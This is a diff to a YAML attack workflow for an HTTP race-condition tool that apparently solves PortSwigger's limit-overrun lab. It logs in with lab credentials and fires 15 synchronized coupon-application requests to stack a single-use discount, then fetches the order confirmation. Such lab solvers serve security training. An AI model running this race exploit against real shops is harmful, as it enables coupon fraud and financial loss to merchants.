@@ -31,9 +31,13 @@ target:
     verify_cert: false
   http:
     follow_redirects: false
+  proxy:
+    type: http
+    host: 127.0.0.1
+    port: 8080
 
 entrypoint:
-  state: get_login_page
+  state: initialize
   input:
     username: "wiener"
     password: "peter"
@@ -47,32 +51,65 @@ entrypoint:
 states:
 
   # --------------------------------------------------------------------------
-  # Authentication Flow
+  # Initialization
   # --------------------------------------------------------------------------
-
-  get_login_page:
-    description: "Get CSRF token from login page"
+  initialize:
+    description: "Check if lab is running"
     request: |
-      GET /login HTTP/1.1
+      GET / HTTP/1.1
       Host: {{ target.host }}
 
     extract:
-      csrf:
-        type: xpath
-        pattern: '//input[@name="csrf"]/@value'
       session:
         type: cookie
         pattern: session
 
     logger:
       on_state_enter: |
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🦎 PortSwigger - Limit Overrun Race Condition                               ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  🎯 Target:   {{ "%-62s" | format(target.host)                            }} ║
+        ║  👤 Username: {{ "%-62s" | format(username)                               }} ║
+        ║  🎟️ Coupon:   {{ "%-63s" | format(coupon_code)                            }} ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
 
-        ╔═══════════════════════════════════════════════════════════════════════╗
-        ║  🦎 PortSwigger - Limit Overrun Race Condition                        ║
-        ╠═══════════════════════════════════════════════════════════════════════╣
-        ║  🎯 Target: {{ "%-57s" | format(target.host)                       }} ║
-        ║  🎟️  Coupon: {{ "%-57s" | format(coupon_code)                      }} ║
-        ╚═══════════════════════════════════════════════════════════════════════╝
+        🔍 Checking if lab is running...
+      on_state_leave: |
+        {% if response.status == 200 %}
+        ✅ Lab is running!
+        🍪 Session: {{ initialize.session }}
+        {% else %}
+        ❌ Lab is not running!
+        {% endif %}
+
+    next:
+      - on_status: 200
+        goto: get_login_page
+      - on_status: [404, 502, 503, 504]
+        goto: end
+
+  # --------------------------------------------------------------------------
+  # Authentication Flow
+  # --------------------------------------------------------------------------
+  get_login_page:
+    description: "Get CSRF token from login page"
+    request: |
+      GET /login HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ initialize.session }}
+
+    extract:
+      csrf:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+
+    logger:
+      on_state_enter: |
+        🔐 Retrieving login page...
+      on_state_leave: |
+        🔑 CSRF: {{ get_login_page.csrf }}
+        
 
     next:
       - on_status: 200
@@ -84,7 +121,7 @@ states:
       POST /login HTTP/1.1
       Host: {{ target.host }}
       Content-Type: application/x-www-form-urlencoded
-      Cookie: session={{ get_login_page.session }}
+      Cookie: session={{ initialize.session }}
       
       username={{ username }}&password={{ password }}&csrf={{ get_login_page.csrf }}
 
@@ -165,6 +202,10 @@ states:
 
   race_apply_coupon:
     description: "Race condition - apply coupon multiple times"
+
+    options:
+      proxy_bypass: true
+
     request: |
       POST /cart/coupon HTTP/1.1
       Host: {{ target.host }}
@@ -174,7 +215,7 @@ states:
       csrf={{ view_cart_before.csrf }}&coupon={{ coupon_code }}
 
     race:
-      threads: 2
+      threads: 15
       sync_mechanism: barrier
       connection_strategy: multiplexed
       thread_propagation: single
@@ -257,7 +298,7 @@ states:
 
     logger:
       on_state_leave: |
-        {% if response.status in [302, 303] %}
+        {% if response.status in [302] %}
 
         ╔══════════════════════════════════════════════════════════════╗
         ║  🏆 LAB SOLVED!                                              ║
@@ -272,7 +313,16 @@ states:
         {{ response.raw_response }}
 
     next:
+      - on_status: 303
+        goto: finish
       - goto: end
+
+  finish:
+    request:
+      GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ login.session }}
+      
 
   end:
     description: "Complete"
